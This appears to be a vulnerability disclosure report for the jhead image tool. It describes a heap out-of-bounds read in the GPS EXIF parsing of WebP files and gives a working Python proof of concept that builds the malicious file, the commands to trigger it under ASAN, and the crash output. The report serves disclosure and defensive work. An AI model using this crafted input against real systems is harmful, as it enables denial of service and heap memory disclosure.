## Bug0: GPS IFD Unchecked Component-Count Loop OOB Read in WebP EXIF

In `ProcessGpsInfo()` (gpsinfo.c:141-155), the loop that reads GPS latitude/longitude rational components always iterates three times regardless of the actual `Components` count in the IFD entry, so when `Components=1` and `OffsetVal=ExifLength-8` the bounds check passes but the loop reads up to 16 bytes beyond the end of the heap-allocated EXIF buffer, causing a heap out-of-bounds read.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def build_webp():
    GPS_IFD_OFFSET  = 26
    RATIONAL_OFFSET = 44
    EXIF_TOTAL      = 52

    tiff_hdr = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)

    ifd0  = struct.pack('<H', 1)
    ifd0 += struct.pack('<HHII', 0x8825, 4, 1, GPS_IFD_OFFSET)
    ifd0 += struct.pack('<I', 0)

    gps_ifd  = struct.pack('<H', 1)
    gps_ifd += struct.pack('<HHII', 0x0002, 5, 1, RATIONAL_OFFSET)
    gps_ifd += struct.pack('<I', 0)

    rational = struct.pack('<II', 45, 1)

    exif_data = tiff_hdr + ifd0 + gps_ifd + rational
    assert len(exif_data) == EXIF_TOTAL

    vp8x_payload = bytes([
        0x08,
        0x00, 0x00, 0x00,
        0x00, 0x00, 0x00,
        0x00, 0x00, 0x00,
    ])

    riff_file_size = 4 + 18 + 60

    riff_hdr  = b'RIFF' + struct.pack('<I', riff_file_size) + b'WEBP'
    vp8x_chunk = b'VP8X' + struct.pack('<I', 10) + vp8x_payload
    exif_chunk = b'EXIF' + struct.pack('<I', EXIF_TOTAL) + exif_data

    return riff_hdr + vp8x_chunk + exif_chunk

webp = build_webp()
with open('poc_input.jpg', 'wb') as f:
    f.write(webp)
print(f"[+] Created poc_input.jpg ({len(webp)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/jhead poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50600000005b at pc 0x562161c88471 bp 0x7fff7f040120 sp 0x7fff7f040110
READ of size 1 at 0x50600000005b thread T0
    #0 0x562161c88470 in Get32s (jhead+0x67470)
    #1 0x562161c963e4 in ProcessGpsInfo (jhead+0x753e4)

### Impact

An attacker can trigger a heap out-of-bounds read of up to 16 bytes past a malloc'd EXIF buffer, causing a denial-of-service crash under ASAN or in production when the read crosses a page boundary. The read may also disclose heap metadata or contents of adjacent allocations to an attacker who can observe program output or error messages. This vulnerability is exposed by any invocation of jhead on an untrusted WebP file containing a crafted GPS IFD entry and requires no special privileges or command-line flags.
